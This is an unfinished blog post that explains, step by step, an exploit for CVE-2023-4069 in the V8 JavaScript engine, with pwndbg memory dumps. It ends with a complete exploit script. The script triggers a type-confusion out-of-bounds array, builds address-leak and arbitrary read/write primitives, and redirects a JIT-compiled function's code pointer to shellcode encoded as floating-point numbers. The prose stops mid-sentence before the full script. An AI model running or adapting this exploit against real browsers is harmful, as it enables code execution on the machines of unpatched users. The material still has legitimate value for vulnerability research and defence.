---
layout: default
---

# Blog under construction (^_^)

# Analysing CVE-2023-4069

# Understanding the exploit line by line

## Exploit Strategy

The vulnerability gives us OOB read. We do following steps to get code execution:

- Find the address of `elements` of `OobDblArr` by using OOB read got from `corruptedArr`.
- Change the size of `OobDblArr` to get OOB read.
- Place `OobObjArr` after `OobDblArr`, place oject of interest in `OobObjArr` and use OOB read of `OobDblArr` to leak address of that object.
- Place `OobDblArr2` in between `OobDblArr` and `OobObjArr`. Replace `OobDblArr2`'s element address with address of leaked object and if we read/write the `OobDblArr2`, we are actually reading/writing the object.
- Encode shellcode in floating point and place it in function `func`.
- Find address of `func` and through that find address of `code` object. Replace it to the starting address of our shellcode.
- Call the `func`. 

```js
  var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
  var oobDblArr2 = [0x41, 0x42, 1.5];
  var oobObjArr = [view, 0x424242];
  oobObjArr[0] = 0x414141;
```

We place arrays in memory according to exploit strategy.

We get the following addresses:

```bash
0x02030019bfd5 <JSFunction func (sfi = 0x02030019b2e5)>
0x020300042139 <JSArray[524686]> // corruptedArr
0x020300042191 <JSArray[0]> // corruptedArr
0x0203000421d1 <JSArray[5]> // oobDblArr
0x020300042239 <JSArray[3]> // oobDblArr2
0x020300042281 <JSArray[2]> // oobObjArr
```

## Note: Ignore the upper 32-bits of all the outputs I have shown. They change in every execution but the lower 32-bits offsets are always the same. 

```js
function searchDblArrIndex(startAddr, corruptedArr, marker1, marker2, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  var addr = startAddr;
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x40504000/2 && corruptedArr[idx + 2] == 0x40508000/2) {
      return idx - 3;
    }
    addr += 4;
  }
}
```

The function gets offsets from the addresses and traverses the `corruptedArr` to find the address of other arrays present in the memory. `corruptedArr` has OOB read access with a very large length. 

```js
function searchObjArrIndex(startAddr, corruptedArr, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x414141 && corruptedArr[idx + 1] == 0x424242) {
      return idx - 2;
    }
  }
}
```

Finds address of OobObjArr.

```js 
function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}
```

```js
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);
```

We have large OOB read from `corruptedArr`. We try to find address of `oobDblArr`'s element object. We do this by starting our search from an address (can be
see through DebugPrint(`oobDblArr`). This gives idea of where to start). We find the offset of that address from `corruptedArr`. We search the memory for numbers stored in `oobDblArr`. One thing to note is that `oobDblArr` is array of type double because it has a double precision number (1.5) in it. 0x41 is represented as 0x0000000040504000 and 0x42 is 0x0000000040508000. If we do DebugPrint(`corruptedArr`), we see that `corruptedArr` is SMI type array. Each index in `oobDblArr` jumps 8-bytes and for `corruptedArr` it jumps 4-bytes. We run loop and find the numbers but these numbers also appear before the `oobDblArr`. So, we need to run the loop again to find numbers at correct address.


As we can see `oobDblArr` is at address 0x020300042191, so we start our search from a little before that say 0x42191.

```bash
pwndbg> x/50wx 0x020300042191-1
0x20300042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x203000421a0:	0x00000901	0x0000000a	0x00000000	(0x40504000) // we need next one, not this
0x203000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x203000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x203000421d0:	0x0018ece5	0x00000219	0x000421e9	0x0000000a
0x203000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x203000421f0:	0x00000000	0x40504000	0x00000000	0x40508000
0x20300042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x20300042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x20300042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x20300042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x20300042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x20300042250:	0x00000901	0x00000006
```

```js
corruptedArr[dblIndex + 3] = 1;
```

We write 1 to `dblIndex + 3` because our first find of DblArrIndex is bogus and we patch it so we don't find it again in the search.

```bash
pwndbg> x/50wx 0x1ca000042191-1
0x1ca000042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x1ca0000421a0:	0x00000901	0x0000000a	0x00000000	(0x00000002) replace by 2.
0x1ca0000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x1ca0000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x1ca0000421d0:	0x0018ece5	0x00000219	0x000421e9	0x0000000a
0x1ca0000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x1ca0000421f0:	0x00000000	0x40504000	0x00000000	0x40508000
0x1ca000042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x1ca000042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x1ca000042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x1ca000042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x1ca000042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x1ca000042250:	0x00000901	0x00000006
```

### Note: The memory has 2 because SMIs have LSB as 0. So, to make sure LSB is 0, SMIs are doubled before storing in memory and halved when accessed from memory.

```js
let dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));
var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 3] = 0x41;
```

We get the offset inside `corruptedArr` to the first found pattern and then start our search from there again. This time we find the original address of pattern that we intended to find. Again we patch the pattern to stop finding the same pattern again and again.

```bash
pwndbg> x/50wx 0x288100042191-1
0x288100042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x2881000421a0:	0x00000901	0x0000000a	0x00000000	0x00000002
0x2881000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x2881000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x2881000421d0:	0x0018ece5	0x00000219	0x000421e9	0x0000000a
0x2881000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x2881000421f0:	0x00000000	(0x00000082)	0x00000000	0x40508000
0x288100042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x288100042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x288100042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x288100042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x288100042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x288100042250:	0x00000901	0x00000006
```

Second pattern patched with 0x41 (0x82 in memory).

```js
if (dblIndex == null || oobDblArr[0] == 0x41) {
    console.log("cannot find dblIndex");
```

Then we check if we found the pattern or not. `oobDblArr[0]` is at address 0x2881000421f0 and it is not 0x41.

```js
else {
    corruptedArr[dblIndex - 3] = 0x100;
    console.log("oobDblArr new length: " + oobDblArr.length);
```

`corruptedArr[dblIndex]` points to `elements` member of `oobDblArr`. If we go back 3 double words (Addresses are 32-bit in v8) we get length member of array. We change that to 256 to get OOB read and write. 

```bash
pwndbg> x/50wx 0x05d300042191-1
0x5d300042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x5d3000421a0:	0x00000901	0x0000000a	0x00000000	0x00000002
0x5d3000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x5d3000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x5d3000421d0:	0x0018ece5	0x00000219	0x000421e9	(0x00000200) from 0xa to 0x200 
0x5d3000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x5d3000421f0:	0x00000000	0x00000082	0x00000000	0x40508000
0x5d300042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x5d300042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x5d300042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x5d300042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x5d300042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x5d300042250:	0x00000901	0x00000006
```

```js
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  dblAddr = indexToAddr(dblIndex + 10);

  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
  var oobDbl2Index = dblIndex;
```

Now we search for `oobDblAddr2's` element object member's address. Same as before, on first try we match the pattern but it is not in`obDblAddr2`, so we try again and get the correct address.

```bash
pwndbg> x/75wx 0x058f00042191-1
0x58f00042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x58f000421a0:	0x00000901	0x0000000a	0x00000000	0x00000002
0x58f000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x58f000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x58f000421d0:	0x0018ece5	0x00000219	0x000421e9	0x00000200
0x58f000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x58f000421f0:	0x00000000	0x00000082	0x00000000	0x40508000
0x58f00042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x58f00042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x58f00042220:	0x00000000	(0x40504000)-> 1	0x00000000	0x40508000
0x58f00042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x58f00042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x58f00042250:	0x00000901	0x00000006	0x00000000	0x40504000
0x58f00042260:	0x00000000	0x40508000	0x00000000	0x3ff80000
0x58f00042270:	0x00000089	0x00000004	0x00000000	0x00848484
0x58f00042280:	0x0018ed65	0x00000219	0x00042299	0x00000004
0x58f00042290:	0x0000117d	0x00207cd9	0x00000089	0x00000004
0x58f000422a0:	0x00828282	0x00848484	0x00000591	0x00000003
0x58f000422b0:	0x00000005	0x65313234	0x00000039
```

We find a pattern that is not inside `OobDblArr2`. We search again this time starting from `dblIndex + 0x10` which translates to 0x58f00042259. 

```js
  let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log(objIndex.toString(16));
  console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));
```

Next we find the address of `oobObjAddr's` element object member's address. We will place any object in this array and read it's address through OOB read in `oobDblAddr`.

```bash
pwndbg> x/80wx 0x2f5500042191-1
0x2f5500042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x2f55000421a0:	0x00000901	0x0000000a	0x00000000	0x00000002
0x2f55000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x2f55000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x2f55000421d0:	0x0018ece5	0x00000219	0x000421e9	0x00000200
0x2f55000421e0:	0x0000117d	0x00207c81	0x00000901	0x0000000a
0x2f55000421f0:	0x00000000	0x00000082	0x00000000	0x40508000
0x2f5500042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x2f5500042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x2f5500042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x2f5500042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x2f5500042240:	0x00042251	0x00000006	0x0000117d	0x00207cad
0x2f5500042250:	0x00000901	0x00000006	0x00000000	0x40504000
0x2f5500042260:	0x00000000	0x40508000	0x00000000	0x3ff80000
0x2f5500042270:	0x00000089	0x00000004	0x00000000	0x00848484
0x2f5500042280:	0x0018ed65	0x00000219	0x00042299	0x00000004
0x2f5500042290:	0x0000117d	0x00207cd9	0x00000089	0x00000004
0x2f55000422a0:	(0x00828282	0x00848484)	0x00000591	0x00000003
0x2f55000422b0:	0x00000005	0x65313234	0x00000039	0x000005e1
0x2f55000422c0:	0x00000003	0x00000011	0x000422d1	0x00000e01
```

We can see in the marked memory that 0x414141 and 0x424242 are present (doubled, ofcourse).

```js
  var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1); 
  console.log("func Addr: " + funcAddr.toString(16));
```

Now, we find the address of `func` function that has our floating point encoded shellcode. We use `(objIndex - oobDblIndex) >> 1`. As we have OOB read in `oobDblArr` of size 256, we calculate distance between `oobDblArr`and `oobObjArr`, place address of `func` in `oobObjArr[0]` and use OOB in `oobDblArr` to read address of `func` which is: `oobObjArr[0]`.

```bash
pwndbg> x/80wx 0x3e8000042191-1
0x3e8000042190:	0x0018e4c1	0x00000219	0x00000219	0x00182271
0x3e80000421a0:	0x00000901	0x0000000a	0x00000000	0x00000002
0x3e80000421b0:	0x00000000	0x40508000	0x00000000	0x40544000
0x3e80000421c0:	0x00000000	0x40548000	0x00000000	0x3ff80000
0x3e80000421d0:	0x0018ece5	0x00000219	0x000421e9	0x00000200
0x3e80000421e0:	0x0000117d	0x00207cad	0x00000901	0x0000000a
0x3e80000421f0:	0x00000000	0x00000082	0x00000000	0x40508000
0x3e8000042200:	0x00000000	0x40544000	0x00000000	0x40548000
0x3e8000042210:	0x00000000	0x3ff80000	0x00000901	0x00000006
0x3e8000042220:	0x00000000	0x40504000	0x00000000	0x40508000
0x3e8000042230:	0x00000000	0x3ff80000	0x0018ece5	0x00000219
0x3e8000042240:	0x00042251	0x00000006	0x0000117d	0x00207cd9
0x3e8000042250:	0x00000901	0x00000006	0x00000000	0x40504000
0x3e8000042260:	0x00000000	0x40508000	0x00000000	0x3ff80000
0x3e8000042270:	0x00000089	0x00000004	0x00000000	0x00848484
0x3e8000042280:	0x0018ed65	0x00000219	0x00042299	0x00000004
0x3e8000042290:	0x0000117d	0x00207d05	0x00000089	0x00000004
0x3e80000422a0:	(0x0019bfd5)	0x00848484	0x00000591	0x00000003
0x3e80000422b0:	0x00000005	0x65313234	0x00000039	0x000005e1
0x3e80000422c0:	0x00000003	0x00000011	0x000422d1	0x00000e01
```

`oobObjArr[0]` is placed after the 2 doublewords of address of `elements` with first part of `elements` being `maps` and second `length`. We can see at address 0x3e80000422a0 the `oobObjArr[0]` has address of `func`. After this we can read address from `oobDblArr[(objIndex - oobDblIndex) >> 1]` as we have OOB read.

We are dividing by 2 because each element in `OobDblArr` is 8 bytes as opposed to 4 byte values in `corruptedArr` so each index would jump twice the memory.

```js
  var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
  var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
  console.log("code Addr: " + codeAddr.toString(16));
```

Next, we 






















































```js
function searchDblArrIndex(startAddr, corruptedArr, marker1, marker2, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  var addr = startAddr;
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x40504000/2 && corruptedArr[idx + 2] == 0x40508000/2) {
      return idx - 3;
    }
    addr += 4;
  }
}

function searchObjArrIndex(startAddr, corruptedArr, limit) {
  var startIndex = getOffset(startAddr);
  var end = getOffset(limit);
  for (let idx = startIndex; idx < end; idx += 1) {
    if (corruptedArr[idx] == 0x414141 && corruptedArr[idx + 1] == 0x424242) {
      return idx - 2;
    }
  }
}


function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;
  var addrDbl = oobDblArr[dblOffset];
  return ftoi32(addrDbl)[0];
}

function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}

function write(addr, val1, val2, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  oobDblArr2[0] = i32tof(val1, val2);
  oobDblArr[dblArrOffset] = oldValue;
  return; 
}

class A {}

var gcSize = 0x4fe00000;

//version dependent
//Address of corruptedArr, serves as starting point of search, does not need to be too accurate
var arrAddr = 0x42191;
var emptyAddr = 0x219;

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
var bigIntView = new BigInt64Array(view);

function func() {
  return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
}
for (let i = 0; i < 1000; i++) func(0);

var x = Array;

class B extends A {
  constructor() {
    x = new.target;
    super();
  }
}
function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}

for (let i = 0; i < 2000; i++) construct();

new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);

corruptedArr = construct();
%DebugPrint(corruptedArr);
corruptedArr = construct();
%DebugPrint(corruptedArr);

function getOffset(addr) {
  return (addr - emptyAddr)/4 - 2;
}

function indexToAddr(idx) {
  return (idx + 2) * 4 + emptyAddr;
}

function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
}

function itof(i) {
    bigIntView = BigInt(i);
    return dblArr[0];
}

function ftoi(f) {
    dblArr[0] = f;
    return bigIntView[0];
}

//Use 1.5 so double representation can be interpreted as SMI to avoid deref crash
var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
%DebugPrint(oobDblArr);
var oobDblArr2 = [0x41, 0x42, 1.5];
var oobObjArr = [view, 0x424242];
oobObjArr[0] = 0x414141;

%SystemBreak();
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);

corruptedArr[dblIndex + 3] = 1;

let dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));
var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 3] = 0x41;
if (dblIndex == null || oobDblArr[0] == 0x41) {
  console.log("cannot find dblIndex");
} else {
  corruptedArr[dblIndex - 3] = 0x100;
  console.log("oobDblArr new length: " + oobDblArr.length);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  dblAddr = indexToAddr(dblIndex + 10);
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
  var oobDbl2Index = dblIndex;
  let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));
  var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1);
  console.log("func Addr: " + funcAddr.toString(16));
  var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
  var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
  console.log("code Addr: " + codeAddr.toString(16));
  var maglevAddr = read(codeAddr + 0x8, dblOffset);
  console.log("maglev Addr: " + maglevAddr[0].toString(16) + " " + maglevAddr[1].toString(16));
  write(codeAddr + 0x8, maglevAddr[0] + 0x80 + 2, maglevAddr[1], dblOffset);
  func();
}
```